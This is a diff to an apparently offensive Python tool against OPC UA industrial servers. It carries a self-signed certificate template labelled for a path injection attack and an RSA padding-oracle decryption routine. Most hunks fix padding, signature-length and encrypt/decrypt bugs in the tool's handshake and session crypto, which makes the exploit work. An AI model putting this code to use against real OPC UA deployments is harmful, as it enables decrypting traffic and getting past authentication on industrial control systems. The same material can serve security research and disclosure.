@@ -24,6 +24,10 @@ def log(msg : str):
 def log_success(msg : str):
   print(f'[+] {msg}')
   
+# Integer division that rounds the result up.
+def ceildiv(a,b):
+  return a // b + (a % b and 1)
+  
 # Self signed certificate template (DER encoded) used for path injection attack.
 SELFSIGNED_CERT_TEMPLATE = b64decode('MIIE6TCCA9GgAwIBAgIKEtz1iOEt2W2zvjANBgkqhkiG9w0BAQsFADB9MSAwHgYKCZImiZPyLGQBGRMQdHRlcnZvb3J0LXNlY3VyYTEXMBUGA1UEChMOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgTB0FyaXpvbmExCzAJBgNVBAYTAlVTMSEwHwYDVQQDExhDb25zb2xlIFJlZmVyZW5jZSBDbGllbnQwHhcNMjQwMzEwMDAwMDAwWhcNMjUwMzEwMDAwMDAwWjB9MSAwHgYKCZImiZPyLGQBGRMQdHRlcnZvb3J0LXNlY3VyYTEXMBUGA1UEChMOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgTB0FyaXpvbmExCzAJBgNVBAYTAlVTMSEwHwYDVQQDExhDb25zb2xlIFJlZmVyZW5jZSBDbGllbnQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCVZar5gJGUm88hIcuTautbRnZ/TvBx4nezaab9djeHTCmx0EezCS/2LSAnCv3uYumvpvd5s03eEPfQ0s26wKqgUj4eKCn2XTukaORJu/jb9mGoD40bRwrMDMxW5CpHZ0xFgnyKHb3QbzzvwFwGTx1bXGz9xMe+J9r5mNzsHVZ46aVOScOrF44ZyRwbNkWAhIiXKgrJoHLKA6LN6iBA+kkKTZc7q+GsoEM5O4pwAXATqMGmsFaV/I05x7CckrNgUVZfT2PwwRMZ1hKITu1Z/Jti6dUzxyF5qWFoL5TDNKFQYPtR13LaQpQkzUqkw8VkUeBiT+hFsiT4GkYuo9Emv9TxAgMBAAGjggFpMIIBZTAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBTJcPReZqL1YOptopao2c+m/nvp8DCBsQYDVR0jBIGpMIGmgBTJcPReZqL1YOptopao2c+m/nvp8KGBgaR/MH0xIDAeBgoJkiaJk/IsZAEZExB0dGVydm9vcnQtc2VjdXJhMRcwFQYDVQQKEw5PUEMgRm91bmRhdGlvbjEQMA4GA1UECBMHQXJpem9uYTELMAkGA1UEBhMCVVMxITAfBgNVBAMTGENvbnNvbGUgUmVmZXJlbmNlIENsaWVudIIKEtz1iOEt2W2zvjAOBgNVHQ8BAf8EBAMCAvQwIAYDVR0lAQH/BBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMFAGA1UdEQRJMEeGM3Vybjp0dGVydm9vcnQtc2VjdXJhOlVBOlF1aWNrc3RhcnRzOlJlZmVyZW5jZUNsaWVudIIQdHRlcnZvb3J0LXNlY3VyYTANBgkqhkiG9w0BAQsFAAOCAQEAjw9zu/9SPD6iOex67jS/xaKc7JhWTa7JBZjY7xPYEhnxSwkyMW7I8AkAK/d5w9/WJl0I2dTlZ8ftKKUFjOV7TrNhT2TNuYVqq9OZQhJYKEPmfUhb5oAHqGLWCixyDfiez69hLii0QT5qVYi5rR5S+C0KQ3uNXRt3subM3edND9LSuUc3DTfc2r6ZFQ9SR0Y0BCf3gLyB7VPrVKxpKspNjTv/5y3dSI4q1VNA+q8OaXxSVUVlTN/Nlg8euWELiHeGGHu3EKqje1swN4cLXoSWfhn6qW/x/PvcUZMvK2xrukrR1f1SR/R9gZm0SKeEEq0nRrn1ASPB5sMtOWPxdruSKA==')
 
@@ -134,7 +138,7 @@ def unencrypted_opn(sock: socket) -> ChannelState:
     crypto=None,
   )
   
-# Do a  OPN protocol with a certificate and private key.
+# Do an OPN protocol handshake with a certificate and private key.
 def authenticated_opn(sock : socket, endpoint : endpointDescription.Type, client_certificate : bytes, privkey : RsaKey) -> ChannelState:
   sp = endpoint.securityPolicyUri
   pk = certificate_publickey(endpoint.serverCertificate)
@@ -162,15 +166,28 @@ def authenticated_opn(sock : socket, endpoint : endpointDescription.Type, client
       receiverCertificateThumbprint=certificate_thumbprint(endpoint.serverCertificate),
       encodedPart=plaintext
     )
-    padded_msg = pkcs7_pad(msg.to_bytes(), rsa_plainblocksize(sp, pk))
-    signature = rsa_sign(sp, privkey, padded_msg)
     
-    msg.encodedPart = b''
-    ciphertext = rsa_ecb_encrypt(sp, pk, padded_msg[len(msg.to_bytes()):] + signature)
-    msg.encodedPart = ciphertext
+    # Some length calculations.
+    cipherblocksize = pk.size_in_bytes()
+    base_msglen = len(msg.to_bytes())
+    plainblocksize = rsa_plainblocksize(sp, pk)
+    padbyte = plainblocksize - (base_msglen + 1) % plainblocksize
+    padding = (padbyte + 1) * bytes([padbyte]) # Redundant padding byte is a weird OPC thing
+    ctextsize = (len(plaintext) + len(padding) + cipherblocksize) // plainblocksize * cipherblocksize
+    
+    # Add padding and adjust length to obtain signature input.
+    msg.encodedPart = plaintext + padding
+    siginput = msg.to_bytes()
+    siginput = siginput[:4] + IntField().to_bytes(len(siginput) - len(plaintext) - len(padding) + ctextsize) + siginput[8:]
+    signature = rsa_sign(sp, privkey, siginput)
+    
+    # Encrypt plaintext, padding and signature.
+    print(hexlify(plaintext + padding + signature))
+    msg.encodedPart = rsa_ecb_encrypt(sp, pk, plaintext + padding + signature)
+    assert len(msg.encodedPart) == ctextsize
     
     replymsg = opc_exchange(sock, msg)
-    convrep, _ = encodedConversation.from_bytes(rsa_ecb_decrypt(sp, privkey, reply.encodedPart))
+    convrep, _ = encodedConversation.from_bytes(rsa_ecb_decrypt(sp, privkey, replymsg.encodedPart))
     resp, _ = openSecureChannelResponse.from_bytes(convrep.requestOrResponse)
     
     return ChannelState(
@@ -198,10 +215,14 @@ def session_exchange(channel : ChannelState,
   
   crypto = channel.crypto
   if crypto:
+    raise Exception('TODO: bugfix session crypto')
     # Add padding and signing into encoded message.
-    msgbytes = msg.to_bytes()
-    padding = pkcs7_pad(msgbytes)[len(msgbytes):]
-    mac = sha_hmac(crypto.policy, crypto.clientKeys.signingKey, msgbytes + padding)
+    basemsg = msg.to_bytes()
+    padbyte = 16 - (len(basemsg) + 1) % 16
+    padding = (padbyte + 1) * bytes([padbyte])
+    macinput = basemsg + padding
+    macinput = macinput[:4] + IntField().to_bytes(len(macinput) + macsize(crypto.policy)) + macinput[8:]
+    mac = sha_hmac(crypto.policy, crypto.clientKeys.signingKey, macinput + padding)
     plaintext = msg.encodedPart + padding + mac
     
     # Encrypt encoded part.
@@ -212,7 +233,7 @@ def session_exchange(channel : ChannelState,
   
   if crypto:
     # Decrypt.
-    plaintext = aes_cbc_encrypt(crypto.serverKeys.encryptionKey, crypto.serverKeys.iv, reply.encodedPart)
+    plaintext = aes_cbc_decrypt(crypto.serverKeys.encryptionKey, crypto.serverKeys.iv, reply.encodedPart)
     
     # Remove signature and padding. Don't bother to validate.
     decodedPart = pkcs7_unpad(plaintext[:macsize(crypto.policy)])
@@ -695,9 +716,6 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
     print(f'[{spinnything}] Progress: iteration {i}; oracle queries: {query_count}', end='\r', file=sys.stderr, flush=True)
     
     return result
-    
-  # Division helper.
-  ceildiv = lambda a,b: a // b + (a % b and 1)
     
   # Step 1: blinding. Find a random blind that makes the padding valid. Searching can be skipped if the ciphertext
   # already has valid padding.
